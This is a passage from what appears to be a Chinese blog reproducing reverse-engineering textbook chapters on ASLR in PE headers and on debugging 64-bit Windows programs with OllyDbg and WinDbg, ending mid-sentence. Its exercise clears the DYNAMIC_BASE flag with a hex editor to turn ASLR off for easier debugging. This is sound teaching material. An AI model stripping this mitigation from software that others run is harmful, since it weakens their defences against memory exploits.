src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315200010082.png#alt=image-20220315200010082"></p><h2 id="41-4-1节区信息"><a href="#41-4-1节区信息" class="headerlink" title="41.4.1节区信息"></a>41.4.1节区信息</h2><p>图41 -5左侧为ASLR.exe文件，右侧为ASLR_no.exe文件。可以清楚看到ASLR.exe文件比ASLR_no.exe文件多岀1个名为“.reloc”的节区。一般而言，普通的EXE文件中是不存在.reloc节区的，该节区仅在应用了ASLR技术的文件中才会出现，它是编译时由编译器生成并保留在可执行文件中的。PE文件被加载到内存时，该节区被用做重定位的参考，它不是EXE文件运行的必需部分，可将其从PE文件中删除（但是由于DLL文件总是需要重定位，所以在DLL文件中不可将其删除）。最重要的部分是IMAGE_FILE_HEADER\Characteristics与IMAGE_OPTIONAL_HEADER\DLL Characteristics这2个字段，下面分别予以说明。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315200728516.png#alt=image-20220315200728516"></p><h2 id="41-4-2-IMAGE-FILE-HEADER-Characteristics"><a href="#41-4-2-IMAGE-FILE-HEADER-Characteristics" class="headerlink" title="41.4.2 IMAGE_FILE_HEADER\Characteristics"></a>41.4.2 IMAGE_FILE_HEADER\Characteristics</h2><p>如图41-6所示，上方为ASLR.exe文件，下方为ASLR_no.exe文件。对于拥有.reloc节区的ASLR.exe文件来说，IMAGE_FILE_HEADER 的 Characteristics 属性字段中并不存在 IMAGE _FILE_RELOCS_STRIPPED（l）标志（由于ASLR.exe文件中多岀 1 个.reloc节区，所以Number of Sections值增1）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315200953234.png#alt=image-20220315200953234"></p><h2 id="41-4-3-IMAGE-OPTIONAL-HEADER-DLL-Characteristics"><a href="#41-4-3-IMAGE-OPTIONAL-HEADER-DLL-Characteristics" class="headerlink" title="41.4.3 IMAGE_OPTIONAL_HEADER\DLL Characteristics"></a>41.4.3 IMAGE_OPTIONAL_HEADER\DLL Characteristics</h2><p>图41-7中，上方为ASLR.exe文件，下方为ASLR_no.exe文件。ASLR.exe文件的IMAGE_OPTIONAL_HEADER\DLL Characteristics 中设有 IMAGE_DLL\CHARACTERISTICS_DYNAMIC_BASE（40）标志。若VC++中开启了&#x2F;DYNAMICBASE选项，编译程序文件时就会设置上该标志值（参考图41-2）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315201303974.png#alt=image-20220315201303974"></p><p>以上我们学习了PE文件头中添加的、与支持ASLR功能相关的信息。下面通过一个练习来学习如何操作这些信息。</p><h1 id="41-5练习：删除ASLR功能"><a href="#41-5练习：删除ASLR功能" class="headerlink" title="41.5练习：删除ASLR功能"></a>41.5练习：删除ASLR功能</h1><h2 id="41-5-1删除ASLR功能"><a href="#41-5-1删除ASLR功能" class="headerlink" title="41.5.1删除ASLR功能"></a>41.5.1删除ASLR功能</h2><p>本练习示例中，我们将使用Hex Editor工具修改ASLR.exe文件，以此来删除ASLR功能。从图41-7中可以看到，IMAGE_OPTIONAL_HEADER\DLLCharacteristics中设IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE（40）标志，删除它即可删除ASLR功能。在Hex Edtior中将DLL属性值由8140更改为8100 （位于136偏移处的WORD值，参考图41-7、图41-8）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315201636689.png#alt=image-20220315201636689"></p><p>保存后在调试器中运行，如图41-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC41%E7%AB%A0%20ASLR.assets/image-20220315201713215.png#alt=image-20220315201713215"></p><p>从图41-9中可以看到，已经成功删除ASLR功能。</p><blockquote><p>当然，也可以通过修改PE文件头向文件中添加ASLR功能，但这样做没什么意义,所以一般都不会这么做3因为，向没有重定位节区（.reloc）的PE文件添加ASLR功能后，文件运行时可能会因不正确的内存引用而发生错误。</p></blockquote><p>如果一个要详细分析的文件应用了ASLR功能，分析前可以暂时将ASLR功能删除，然后再调试分析，由于文件总是被加载到相同的内存地址，所以分析起来会更简便。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第40章 64位调试</title>
    <link href="/1999/03/31/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95/"/>
    <url>/1999/03/31/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>第40章64位调试</p><p>本章将学习64位环境中的调试方法。64位环境中（x64+Windows OS 64位），32位进程与64位进程彼此共存，所以在64位环境中应当能够调试PE32与PE32+这2种文件。本章学习过程中还要就各种情形下调试的热点展开讨论，让大家进一步加深对64位环境下调试的理解。</p><p>本章讲解中将不会涉及有关IA-64调试的内容。IA-64（Itanium）搭载于高性能服务器中，我们一般不会接触到。由于Windbg与IDA Pro都支持x64与IA-64,所以可以正常使用它们调试IA-64。需要注意的是，IA-64的指令体系不同于x64&#x2F;x86，详细分析代码时请参考Intel用户手册。</p><h1 id="40-1-x64环境下的调试器"><a href="#40-1-x64环境下的调试器" class="headerlink" title="40.1 x64环境下的调试器"></a>40.1 x64环境下的调试器</h1><p>x64芯片从诞生之日起就完全支持X86，所以32位OS与64位OS都可以安装。Windows 64位OS不仅可以运行64位进程（PE32+类型），还可以同时（向下兼容）运行32位进程（PE32类型）。 在32位&#x2F;64位CPU、OS、进程彼此共存的情形下整理了各OS与进程可用的调试器（参考表40-1）。</p><table><thead><tr><th>OS</th><th>PE32</th><th>PE32+</th></tr></thead><tbody><tr><td>32位</td><td>OllyDbg、 IDA Pro、 WinDbg</td><td>IDA Pro(DisassembIe only)</td></tr><tr><td>64位</td><td>OllyDbg、 IDA Pro、 WinDbg</td><td>IDA Pro、WinDbg</td></tr></tbody></table><p>在32位OS中无法调试PE32+文件，但是使用IDA Pro可以查看PE32+文件内的反汇编代码。另外，令人遗憾的是，OllyDbg调试器并不支持PE32+文件。因此，进行PE32+调试时必须在64位OS中使用IDA Pro正式版本和Windbg 64位版本还有x64dbg。下面通过一个练习文件（WOW64Test_x64.exe）</p><p>来学习在64位环境（x64&amp;Windows 7 64位）下调试的方法。</p><h1 id="40-2-64位调试"><a href="#40-2-64位调试" class="headerlink" title="40.2 64位调试"></a>40.2 64位调试</h1><p>本节继续以前面的WOW64测试文件（WOW64Test_x64.exe）作为练习示例进行64位调试练习。</p><p><strong>练习示例：WOW64Test</strong></p><p>先看示例文件的源代码（WOW64Test.cpp）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Shlobj.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Shell32.lib&quot;</span>)</span><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br>    HKEY    hKey                = <span class="hljs-literal">NULL</span>;<br>    HANDLE  hFile               = INVALID_HANDLE_VALUE;<br>    TCHAR   szPath[MAX_PATH]    = &#123;<span class="hljs-number">0</span>,&#125;;<br><br>    <span class="hljs-comment">////////////////</span><br>    <span class="hljs-comment">// system32 folder</span><br>    <span class="hljs-keyword">if</span>( GetSystemDirectory(szPath, MAX_PATH) )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;1) system32 path = %s\n&quot;</span>, szPath);<br>    &#125;<br><br>    <span class="hljs-comment">////////////////</span><br>    <span class="hljs-comment">// File size</span><br>    _tcscat_s(szPath, <span class="hljs-string">L&quot;\\kernel32.dll&quot;</span>);<br>    hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, <br>                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span>( hFile != INVALID_HANDLE_VALUE )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;2) File size of \&quot;%s\&quot; = %d\n&quot;</span>, <br>        szPath, GetFileSize(hFile, <span class="hljs-literal">NULL</span>));<br>        CloseHandle(hFile);<br>    &#125;<br><br>    <span class="hljs-comment">////////////////</span><br>    <span class="hljs-comment">// Program Files</span><br>    <span class="hljs-keyword">if</span>( SHGetSpecialFolderPath(<span class="hljs-literal">NULL</span>, szPath, <br>                               CSIDL_PROGRAM_FILES, FALSE) )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;3) Program Files path = %s\n&quot;</span>, szPath);<br>    &#125;<br><br>    <span class="hljs-comment">////////////////</span><br>    <span class="hljs-comment">// Registry</span><br>    <span class="hljs-keyword">if</span>( ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE, <br>                                      <span class="hljs-string">L&quot;SOFTWARE\\ReverseCore&quot;</span>, &amp;hKey) )<br>    &#123;<br>        RegCloseKey(hKey);<br>        _tprintf(<span class="hljs-string">L&quot;4) Create Registry Key : HKLM\\SOFTWARE\\ReverseCore\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>WOW64Test示例程序非常简单，它先调用GetSystemDirectory()、CreateFile()、SHGetSpecialFolderPath()、RegCreateKey()这4个API，然后输出运行结果。64位系统环境下，X86应用程序是通过WOW64模式运行的，所以系统文件夹与重要的注册表键都要重定向，本示例明确表明了这一点。</p><p>借助Visual C++2010 Express EditionX具将上述源代码分别编译为x86（ WOW64Test_x86.exe）与x64程序（WOW64Test_x64.exe）,然后运行，如图40-1所示。</p><p>下节分别调试这2个程序。</p><blockquote><p>在Windows XP&#x2F;Vista&#x2F;7 64位系统下才能正常调试示例文件。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318192646597.png#alt=image-20220318192646597"></p><h1 id="40-3-PE32：-WOW64Test-x86-exe"><a href="#40-3-PE32：-WOW64Test-x86-exe" class="headerlink" title="40.3 PE32： WOW64Test_x86.exe"></a>40.3 PE32： WOW64Test_x86.exe</h1><p>Windows 64位OS中，PE32文件（SYS文件除外）通过WOW64模式运行。原32位环境中使用的逆向分析工具大部分可以照常使用，但是OllyDbg 1.10对x64环境支持得并不好，建议使用OllyDbg 2.0版本。</p><blockquote><p>（1） OllyDbg 1.10无法直接在WOW64环境中运行，但是安装Olly Advanced（或AdvancedOlly）插件后，复选x64选项即可正常运行（参考图40-2）。</p></blockquote><p><a href="http://tuts4you.com/download.php7view.75">http://tuts4you.com/download.php7view.75</a></p><p>Olly Advanced是一个非常有用的插件，它修正了 OllyDbg本身的Bug,也提供了反调试等功能。大部分OllyDbg用户都安装使用。</p><blockquote><p>（2）使用VC++ 2010编写的基于控制台的EXE文件中，用户代码一般都存在于代码节区的<strong>顶端</strong>位置，请记住这一点。</p></blockquote><h2 id="40-3-1-EP-代码"><a href="#40-3-1-EP-代码" class="headerlink" title="40.3.1 EP 代码"></a>40.3.1 EP 代码</h2><p>打开WOW64Test x86.exe文件后，调试器自动暂停在EP代码处，如图40-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318193101660.png#alt=image-20220318193101660"></p><p>前面已经分析过由VC++2010工具生成的（基于控制台的）PE32文件的EP代码，此处不再赘述。接下来直接查找main()函数。</p><h2 id="40-3-2-Startup-代码"><a href="#40-3-2-Startup-代码" class="headerlink" title="40.3.2 Startup 代码"></a>40.3.2 Startup 代码</h2><p>跟踪004013F5地址处的JMP 0040128F指令，岀现如图40-4所示的Startup代码</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318193222767.png#alt=image-20220318193222767"></p><p>WOW64Test_x86是一个控制台程序，所以Startup代码内部存在调用main()函数的CALL指令。若刚开始学逆向分析技术时遇到CALL指令，建议跟踪进人函数，详细了解各函数的代码。</p><blockquote><p>刚开始的时候不要跟踪进入得太深，深入1-depth查看代码即可。熟悉调试之后再逐渐加深，熟悉更深层次的代码。这种训练对于把握Visual C++的Startup代码与用户代码的区别有很大帮助。一名经过良好训练的逆向分析人员在实际的代码分析过程中能够快速跳过Startup代码，直接找到用户代码，即使在比较混乱的地方也不会轻易迷路而徘徊不定。</p></blockquote><h2 id="40-3-3-main-函数"><a href="#40-3-3-main-函数" class="headerlink" title="40.3.3 main()函数"></a>40.3.3 main()函数</h2><p>下面查找main()函数。已知信息罗列如下，我们将通过这些信息来查找main()函数。</p><p>（1）被调试者（WOW64Test_x86.exe）是一个基于控制台的应用程序。</p><p>由此我们可以猜想到，WOW64Test_x86.exe调用main()函数前会先调用GetCommandLine()API。这是因为调用main()函数之前需要先把<code>main(int argc,char* argv[])</code>函数的参数存储到栈（x64环境下为寄存器）中。也就是说，在GetCommandLine()API设置好断点后，查看返回地址即可查找到调用main()函数的部分。此外，调用main()函数前argc与argv参数被存储在栈（x64环境下为寄存器）中，仔细查看栈（或者寄存器）也能直接找到调用main()函数的部分。</p><p>（2）调用GetSystemDirectory()、GetFileSize()、CreateFile()等API。</p><p>应用程序中使用的API很明确时，直接在相应API上设置断点，通过其返回地址也可以直接查找并进人main()函数代码。</p><p>（3） 在画面中输出由上述API获取的信息。</p><p>使用OllyDbg强大的字符串检索功能，可以直接查找并定位到指定代码处。下面我们使用第三项来查找main()函数。在OllyDbg代码窗口的鼠标右键菜单中选择Search for-All referenced strings项，如图40-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318193548657.png#alt=image-20220318193548657"></p><p>图40-5中列岀了程序中出现的所有字符串，双击顶端的00401058地址即显示出main()函数代码，如40-6所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318193755968.png#alt=image-20220318193755968"></p><p>可以清楚看到，函数栈帧从401000地址开始，即401000地址是mainO函数的开始部分（该地址就是第一个.text节区的起始地址）。在64位环境中调试PE32文件的方法与在32位环境中的调试</p><p>方法是一样的。但是部分代码逆向分析工具在64位环境中无法正常使用，所以使用前必须确认。</p><h1 id="40-4-PE32-：-WOW64Test-x64-exe"><a href="#40-4-PE32-：-WOW64Test-x64-exe" class="headerlink" title="40.4 PE32+： WOW64Test_x64.exe"></a>40.4 PE32+： WOW64Test_x64.exe</h1><p>要在64位环境中正常调试PE32+文件，需要使用IDA Pro或Windbg调试工具（参考表40-1）。此处我们选用免费的WinDbg调试器来调试PE32+文件，学习调试过程中注意与前面介绍过的</p><p>OllyDbg+PE32的调试方法比较。</p><p>运行WinDbg64调试器，使用Open Executable…菜单，开始调试WOW64Test_x64.exe文件，如图40-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318194002923.png#alt=image-20220318194002923"></p><h3 id="40-4-1系统断点"><a href="#40-4-1系统断点" class="headerlink" title="40.4.1系统断点"></a>40.4.1系统断点</h3><p>如图40-8所示，调试暂停在系统断点（ntdll.dll区域）。由于WinDbg中没有“暂停在进程EP处”的选项，所以需要从当前暂停位置直接转到EP处。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318194125999.png#alt=image-20220318194125999"></p><h2 id="40-4-2-EP-代码"><a href="#40-4-2-EP-代码" class="headerlink" title="40.4.2 EP 代码"></a>40.4.2 EP 代码</h2><p>首先要获取EP地址，输入显示进程PE文件头的命令，如图40-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318194255460.png#alt=image-20220318194255460"></p><p>EP地址（RVA）为142C，使用g命令转到该地址处，如图40-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318194414485.png#alt=image-20220318194414485"></p><p>WinDbg默认仅显示1行命令，使用下列命令增加指令显示的条数。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">u</span> <span class="hljs-symbol">&lt;address&gt;</span>L&lt;<span class="hljs-built_in">line</span> <span class="hljs-keyword">number</span>&gt;<br></code></pre></td></tr></table></figure><p>图40-11是使用Visual C++ 2010工具创建的PE32+文件的EP Startup代码。请将它与图40-3中PE32文件的EP代码比较。CALL+JMP指令结构是一样的。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC40%E7%AB%A0%2064%E4%BD%8D%E8%B0%83%E8%AF%95.assets/image-20220318194514924.png#alt=image-20220318194514924"></p><h2 id="40-4-3-Startup-代码"><a href="#40-4-3-Startup-代码" class="headerlink" title="40.4.3 Startup 代码"></a>40.4.3 Startup 代码</h2><p>跟踪（t）位于00000001’40001439地址处的JMP指令，增加指令显示的条数后[u eip L60]，可</p><p>以看所有Startup代码，如代码40-2所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0:000&gt; u eip L60<br>WOW64Test_x64+0x142c:<br>00000001`4000142c 4883ec28        sub     rsp,28h<br>00000001`40001430 e8072a0000      call    WOW64Test_x64+0x3e3c (00000001`40003e3c)<br>00000001`40001435 4883c428        add     rsp,28h<br>00000001`40001439 e976feffff      jmp     WOW64Test_x64+0x12b4 (00000001`400012b4)<br>00000001`4000143e cc              int     3<br>00000001`4000143f cc              int     3<br>00000001`40001440 48894c2408      mov     qword ptr [rsp+8],rcx<br>00000001`40001445 4881ec88000000  sub     rsp,88h<br>00000001`4000144c 488d0d0dbf0000  lea     rcx,[WOW64Test_x64+0xd360 (00000001`4000d360)]<br>00000001`40001453 ff151f7c0000    call    qword ptr [WOW64Test_x64+0x9078 (00000001`40009078)]<br>00000001`40001459 488b05f8bf0000  mov     rax,qword ptr [WOW64Test_x64+0xd458 (00000001`4000d458)]<br>00000001`40001460 4889442458      mov     qword ptr [rsp+58h],rax<br>00000001`40001465 4533c0          xor     r8d,r8d<br>00000001`40001468 488d542460      lea     rdx,[rsp+60h]<br>00000001`4000146d 488b4c2458      mov     rcx,qword ptr [rsp+58h]<br>00000001`40001472 e8f5750000      call    WOW64Test_x64+0x8a6c (00000001`40008a6c)<br>00000001`40001477 4889442450      mov     qword ptr [rsp+50h],rax<br>00000001`4000147c 48837c245000    cmp     qword ptr [rsp+50h],0<br>00000001`40001482 7441            je      WOW64Test_x64+0x14c5 (00000001`400014c5)<br>00000001`40001484 48c744243800000000 mov   qword ptr [rsp+38h],0<br>00000001`4000148d 488d442448      lea     rax,[rsp+48h]<br>00000001`40001492 4889442430      mov     qword ptr [rsp+30h],rax<br>00000001`40001497 488d442440      lea     rax,[rsp+40h]<br>00000001`4000149c 4889442428      mov     qword ptr [rsp+28h],rax<br>00000001`400014a1 488d05b8be0000  lea     rax,[WOW64Test_x64+0xd360 (00000001`4000d360)]<br>00000001`400014a8 4889442420      mov     qword ptr [rsp+20h],rax<br>00000001`400014ad 4c8b4c2450      mov     r9,qword ptr [rsp+50h]<br>00000001`400014b2 4c8b442458      mov     r8,qword ptr [rsp+58h]<br>00000001`400014b7 488b542460      mov     rdx,qword ptr [rsp+60h]<br>00000001`400014bc 33c9            xor     ecx,ecx<br>00000001`400014be e8a3750000      call    WOW64Test_x64+0x8a66 (00000001`40008a66)<br>00000001`400014c3 eb22            jmp     WOW64Test_x64+0x14e7 (00000001`400014e7)<br>00000001`400014c5 488b842488000000 mov     rax,qword ptr [rsp+88h]<br>00000001`400014cd 48890584bf0000  mov     qword ptr [WOW64Test_x64+0xd458 (00000001`4000d458)],rax<br>00000001`400014d4 488d842488000000 lea     rax,[rsp+88h]<br>00000001`400014dc 4883c008        add     rax,8<br>00000001`400014e0 48890511bf0000  mov     qword ptr [WOW64Test_x64+0xd3f8 (00000001`4000d3f8)],rax<br>00000001`400014e7 488b056abf0000  mov     rax,qword ptr [WOW64Test_x64+0xd458 (00000001`4000d458)]<br>00000001`400014ee 488905dbbd0000  mov     qword ptr [WOW64Test_x64+0xd2d0 (00000001`4000d2d0)],rax<br>00000001`400014f5 488b842490000000 mov     rax,qword ptr [rsp+90h]<br>00000001`400014fd 488905dcbe0000  mov     qword ptr [WOW64Test_x64+0xd3e0 (00000001`4000d3e0)],rax<br>00000001`40001504 c705b2bd0000090400c0 mov dword ptr [WOW64Test_x64+0xd2c0 (00000001`4000d2c0)],0C0000409h<br>00000001`4000150e c705acbd000001000000 mov dword ptr [WOW64Test_x64+0xd2c4 (00000001`4000d2c4)],1<br>00000001`40001518 488b05e9aa0000  mov     rax,qword ptr [WOW64Test_x64+0xc008 (00000001`4000c008)]<br>00000001`4000151f 4889442468      mov     qword ptr [rsp+68h],rax<br>00000001`40001524 488b05e5aa0000  mov     rax,qword ptr [WOW64Test_x64+0xc010 (00000001`4000c010)]<br>00000001`4000152b 4889442470      mov     qword ptr [rsp+70h],rax<br>00000001`40001530 ff152a7b0000    call    qword ptr [WOW64Test_x64+0x9060 (00000001`40009060)]<br>00000001`40001536 89051cbe0000    mov     dword ptr [WOW64Test_x64+0xd358 (00000001`4000d358)],eax<br>00000001`4000153c b901000000      mov     ecx,1<br>00000001`40001541 e8aa290000      call    WOW64Test_x64+0x3ef0 (00000001`40003ef0)<br>00000001`40001546 33c9            xor     ecx,ecx<br>00000001`40001548 ff150a7b0000    call    qword ptr [WOW64Test_x64+0x9058 (00000001`40009058)]<br>00000001`4000154e 488d0d7b7d0000  lea     rcx,[WOW64Test_x64+0x92d0 (00000001`400092d0)]<br>00000001`40001555 ff15f57a0000    call    qword ptr [WOW64Test_x64+0x9050 (00000001`40009050)]<br>00000001`4000155b 833df6bd000000  cmp     dword ptr [WOW64Test_x64+0xd358 (00000001`4000d358)],0<br>00000001`40001562 750a            jne     WOW64Test_x64+0x156e (00000001`4000156e)<br>00000001`40001564 b901000000      mov     ecx,1<br>00000001`40001569 e882290000      call    WOW64Test_x64+0x3ef0 (00000001`40003ef0)<br>00000001`4000156e ff15d47a0000    call    qword ptr [WOW64Test_x64+0x9048 (00000001`40009048)]<br>00000001`40001574 ba090400c0      mov     edx,0C0000409h<br>00000001`40001579 488bc8          mov     rcx,rax<br>00000001`4000157c ff15be7a0000    call    qword ptr [WOW64Test_x64+0x9040 (00000001`40009040)]<br>00000001`40001582 4881c488000000  add     rsp,88h<br>00000001`40001589 c3              ret<br>00000001`4000158a cc              int     3<br>00000001`4000158b cc              int     3<br>00000001`4000158c 4c8bdc          mov     r11,rsp<br>00000001`4000158f 49895b08        mov     qword ptr [r11+8],rbx<br>00000001`40001593 49896b18        mov     qword ptr [r11+18h],rbp<br>00000001`40001597 49897320        mov     qword ptr [r11+20h],rsi<br>00000001`4000159b 49895310        mov     qword ptr [r11+10h],rdx<br>00000001`4000159f 57              push    rdi<br>00000001`400015a0 4154            push    r12<br>00000001`400015a2 4155            push    r13<br>00000001`400015a4 4156            push    r14<br>00000001`400015a6 4157            push    r15<br>00000001`400015a8 4883ec40        sub     rsp,40h<br>00000001`400015ac 4d8b7908        mov     r15,qword ptr [r9+8]<br>00000001`400015b0 4d8b31          mov     r14,qword ptr [r9]<br>00000001`400015b3 8b4104          mov     eax,dword ptr [rcx+4]<br>00000001`400015b6 498b7938        mov     rdi,qword ptr [r9+38h]<br>00000001`400015ba 4d2bf7          sub     r14,r15<br>00000001`400015bd 4d8be1          mov     r12,r9<br>00000001`400015c0 4c8bea          mov     r13,rdx<br>00000001`400015c3 488be9          mov     rbp,rcx<br>00000001`400015c6 a866            test    al,66h<br>00000001`400015c8 0f85ed000000    jne     WOW64Test_x64+0x16bb (00000001`400016bb)<br>00000001`400015ce 49637148        movsxd  rsi,dword ptr [r9+48h]<br>00000001`400015d2 49894bc8        mov     qword ptr [r11-38h],rcx<br>00000001`400015d6 4d8943d0        mov     qword ptr [r11-30h],r8<br>00000001`400015da 488bc6          mov     rax,rsi<br>00000001`400015dd 3b37            cmp     esi,dword ptr [rdi]<br>00000001`400015df 0f8381010000    jae     WOW64Test_x64+0x1766 (00000001`40001766)<br>00000001`400015e5 4803c0          add     rax,rax<br>00000001`400015e8 488d5cc70c      lea     rbx,[rdi+rax*8+0Ch]<br></code></pre></td></tr></table></figure><p>到现在为止，我们已经通过OllyDbg调试器看到过许多用VC编写的PE32文件的Startup代 